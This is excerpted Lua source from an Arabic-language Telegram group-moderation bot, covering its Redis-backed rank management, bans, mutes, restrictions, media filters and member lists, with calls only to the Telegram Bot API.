DevLeo:srem(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevLeo:sismember(Tayku..'Rio:RioSudo:',result.id_) then
Riosudo = 'المطورين الاساسيين • ' else Riosudo = '' end
if DevLeo:sismember(Tayku..'Rio:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevLeo:sismember(Tayku..'Rio:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevLeo:sismember(Tayku..'Rio:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevLeo:sismember(Tayku..'Rio:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevLeo:sismember(Tayku..'Rio:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevLeo:sismember(Tayku..'Rio:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevLeo:sismember(Tayku..'Rio:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevLeo:sismember(Tayku..'Rio:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevLeo:srem(Tayku..'Rio:RioSudo:', result.id_)
DevLeo:srem(Tayku..'Rio:SecondSudo:', result.id_)
DevLeo:srem(Tayku..'Rio:SudoBot:', result.id_)
DevLeo:srem(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevLeo:srem(Tayku..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevLeo:srem(Tayku..'Rio:Managers:'..msg.chat_id_, result.id_)
DevLeo:srem(Tayku..'Rio:Admins:'..msg.chat_id_, result.id_)
DevLeo:srem(Tayku..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevLeo:srem(Tayku..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevLeo:srem(Tayku..'Rio:SecondSudo:', result.id_)
DevLeo:srem(Tayku..'Rio:SudoBot:', result.id_)
DevLeo:srem(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevLeo:sadd(Tayku..'Rio:RioSudo:',result.sender_user_id_)
...
if result.id_ then
DevLeo:sadd(Tayku..'Rio:RioSudo:',result.id_)
...
DevLeo:sadd(Tayku..'Rio:RioSudo:',user)
...
DevLeo:srem(Tayku..'Rio:RioSudo:',user)
...
function sudo_reply(extra, result, success)
DevLeo:sadd(Tayku..'Rio:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevLeo:sadd(Tayku..'Rio:SecondSudo:',result.id_)
...
DevLeo:sadd(Tayku..'Rio:SecondSudo:',user)
...
DevLeo:srem(Tayku..'Rio:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevLeo:sadd(Tayku..'Rio:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevLeo:sadd(Tayku..'Rio:SudoBot:',result.id_)
...
DevLeo:sadd(Tayku..'Rio:SudoBot:',user)
...
DevLeo:srem(Tayku..'Rio:SudoBot:',user)
...
DevLeo:sadd(Tayku..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevLeo:sadd(Tayku..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevLeo:sadd(Tayku..'Rio:Owner:'..msg.chat_id_,user)
...
DevLeo:srem(Tayku..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
DevLeo:srem(Tayku..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevLeo:srem(Tayku..'Rio:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevLeo:get(Tayku.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevLeo:sadd(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevLeo:sadd(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevLeo:sadd(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevLeo:srem(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevLeo:sadd(Tayku..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevLeo:sadd(Tayku..'Rio:Constructor:'..msg.chat_id_,result.id_)
...
DevLeo:sadd(Tayku..'Rio:Constructor:'..msg.chat_id_,user)
...
DevLeo:srem(Tayku..'Rio:Constructor:'..msg.chat_id_,user)
...
DevLeo:sadd(Tayku..'Rio:Managers:'..msg.chat_id_,user)
...
DevLeo:srem(Tayku..'Rio:Managers:'..msg.chat_id_,user)
...
DevLeo:sadd(Tayku..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevLeo:sadd(Tayku..'Rio:Cleaner:'..msg.chat_id_,result.id_)
...
DevLeo:sadd(Tayku..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevLeo:srem(Tayku..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevLeo:sadd(Tayku..'Rio:Admins:'..msg.chat_id_,user)
...
DevLeo:srem(Tayku..'Rio:Admins:'..msg.chat_id_,user)
...
DevLeo:sadd(Tayku..'Rio:VipMem:'..msg.chat_id_,user)
...
DevLeo:srem(Tayku..'Rio:VipMem:'..msg.chat_id_,user)
...
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Tayku)
local GetInfo = JSON.decode(Check)
...
TaykuTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,TaykuTeam[math.random(#TaykuTeam)])
end
--     Source Tayku     --
...
DevLeo:del(Tayku.."Rio:Lock:KickBan"..msg.chat_id_)
...
DevLeo:set(Tayku.."Rio:Lock:KickBan"..msg.chat_id_,"true")
...
DevLeo:del(Tayku.."Rio:Lock:MuteTked"..msg.chat_id_)
...
DevLeo:set(Tayku.."Rio:Lock:MuteTked"..msg.chat_id_,"true")
...
DevLeo:del(Tayku.."Rio:Lock:ProSet"..msg.chat_id_)
...
DevLeo:set(Tayku.."Rio:Lock:ProSet"..msg.chat_id_,"true")
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source Tayku     --
...
if not RioConstructor(msg) and DevLeo:get(Tayku.."Rio:Lock:KickBan"..msg.chat_id_) then 
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevLeo:sadd(Tayku..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevLeo:get(Tayku.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevLeo:sadd(Tayku..'Rio:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevLeo:sadd(Tayku..'Rio:Ban:'..msg.chat_id_, user)
...
DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_, result.id_)
...
DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_, user)
...
if not RioConstructor(msg) and DevLeo:get(Tayku.."Rio:Lock:MuteTked"..msg.chat_id_) then 
...
if DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevLeo:sadd(Tayku..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevLeo:sadd(Tayku..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevLeo:sadd(Tayku..'Rio:Muted:'..msg.chat_id_, user)
...
if not DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if not DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_, user)
...
DevLeo:sadd(Tayku..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevLeo:sadd(Tayku..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevLeo:sadd(Tayku..'Rio:Tkeed:'..msg.chat_id_, user)
...
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_, user)
...
if DevLeo:sismember(Tayku..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevLeo:sismember(Tayku..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevLeo:sadd(Tayku..'Rio:BanAll:', result.sender_user_id_)
...
if DevLeo:sismember(Tayku..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevLeo:sismember(Tayku..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevLeo:sadd(Tayku..'Rio:BanAll:', result.id_)
...
if tonumber(user) == tonumber(Tayku) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
...
if DevLeo:sismember(Tayku..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevLeo:sismember(Tayku..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevLeo:sadd(Tayku..'Rio:BanAll:', user)
...
DevLeo:sadd(Tayku..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevLeo:sadd(Tayku..'Rio:MuteAll:', result.id_)
...
DevLeo:sadd(Tayku..'Rio:MuteAll:', user)
...
DevLeo:srem(Tayku..'Rio:BanAll:', result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevLeo:srem(Tayku..'Rio:BanAll:', result.id_)
DevLeo:srem(Tayku..'Rio:MuteAll:', result.id_)
...
DevLeo:srem(Tayku..'Rio:BanAll:', user)
DevLeo:srem(Tayku..'Rio:MuteAll:', user)
...
DevLeo:setex(Tayku.."Rio:EditDev"..msg.sender_user_id_,300,true)
end
if DevLeo:get(Tayku.."Rio:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'᥀︙تم الغاء امر تغير المطور الاساسي')
DevLeo:del(Tayku.."Rio:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevLeo:del(Tayku.."Rio:EditDev"..msg.sender_user_id_)
DevLeo:set(Tayku.."Rio:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source Tayku     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevLeo:get(Tayku..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevLeo:sismember(Tayku..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطايه") 
DevLeo:sadd(Tayku..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Tayku     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevLeo:get(Tayku..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevLeo:sismember(Tayku..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مطي ليتم تنزيله") 
else
DevLeo:srem(Tayku..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevLeo:set('TaykuTeam:'..Tayku..'id:user'..msg.chat_id_,TXT)  
DevLeo:setex('TaykuTeam:'..Tayku.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevLeo:del(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevLeo:incrby(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevLeo:set('TaykuTeam:'..Tayku..'ids:user'..msg.chat_id_,TXT)  
DevLeo:setex('TaykuTeam:'..Tayku.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevLeo:get(Tayku..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevLeo:sadd(Tayku.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevLeo:sadd(Tayku.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
if DevLeo:get(Tayku..'Rio:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevLeo:sadd(Tayku.."Rio:cleanernum"..msg.chat_id_, msg.id_) else DevLeo:sadd(Tayku.."Rio:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevLeo:get(Tayku..'Rio:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevLeo:sadd(Tayku.."Rio:cleanermusic"..msg.chat_id_, msg.id_) else DevLeo:sadd(Tayku.."Rio:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevLeo:sismember(Tayku.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevLeo:set(Tayku..'Rio:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevLeo:smembers(Tayku..'Rio:VipMem:'..msg.chat_id_)
text = "᥀︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
local List = DevLeo:smembers(Tayku..rio)
text = "᥀︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
local List = DevLeo:smembers(Tayku..'Rio:Managers:'..msg.chat_id_)
text = "᥀︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
local List = DevLeo:smembers(Tayku..'Rio:Cleaner:'..msg.chat_id_)
text = "᥀︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
local List = DevLeo:smembers(Tayku..'Rio:Constructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
local List = DevLeo:smembers(Tayku..'Rio:Owner:'..msg.chat_id_)
text = "᥀︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
local List = DevLeo:smembers(Tayku..'Rio:BasicConstructor:'..msg.chat_id_)
...
local List = DevLeo:smembers(Tayku..'Rio:Muted:'..msg.chat_id_)
...
local List = DevLeo:smembers(Tayku..'Rio:Tkeed:'..msg.chat_id_)
text = "᥀︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
local List = DevLeo:smembers(Tayku..'Rio:Ban:'..msg.chat_id_)
...
local List = DevLeo:smembers(Tayku..'User:Donky:'..msg.chat_id_)
...
local List = DevLeo:hkeys(Tayku..'Rio:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevLeo:smembers(Tayku..'Rio:RioSudo:')
...
local List = DevLeo:smembers(Tayku..'Rio:SecondSudo:')
...
local BanAll = DevLeo:smembers(Tayku..'Rio:BanAll:')
local MuteAll = DevLeo:smembers(Tayku..'Rio:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevLeo:smembers(Tayku..'Rio:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevLeo:get(Tayku..'Rio:Sudos'..v) 
local username = DevLeo:get(Tayku..'Save:UserName'..v)
if username then
...
DevLeo:sadd(Tayku.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevLeo:srem(Tayku.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevLeo:srem(Tayku.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevLeo:srem(Tayku.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevLeo:get(Tayku..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevLeo:sismember(Tayku..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevLeo:sismember(Tayku..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevLeo:sismember(Tayku..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevLeo:sismember(Tayku..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevLeo:sismember(Tayku..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevLeo:get(Tayku..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevLeo:sismember(Tayku..'Rio:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevLeo:sismember(Tayku..'Rio:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevLeo:sismember(Tayku..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevLeo:sismember(Tayku..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevLeo:sismember(Tayku..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevLeo:get(Tayku..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevLeo:sismember(Tayku..'Rio:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevLeo:sismember(Tayku..'Rio:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevLeo:sismember(Tayku..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevLeo:sismember(Tayku..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevLeo:sismember(Tayku..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevLeo:get(Tayku..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevLeo:sismember(Tayku..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevLeo:sismember(Tayku..'Rio:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevLeo:sismember(Tayku..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevLeo:sismember(Tayku..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevLeo:sismember(Tayku..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevLeo:sismember(Tayku..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevLeo:sismember(Tayku..'Rio:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevLeo:sismember(Tayku..'Rio:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevLeo:sismember(Tayku..'Rio:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevLeo:srem(Tayku..'Rio:BanAll:',result.sender_user_id_) DevLeo:srem(Tayku..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_,user) DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_,user) DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_,user) DevLeo:srem(Tayku..'Rio:BanAll:',user) DevLeo:srem(Tayku..'Rio:MuteAll:',user)
else
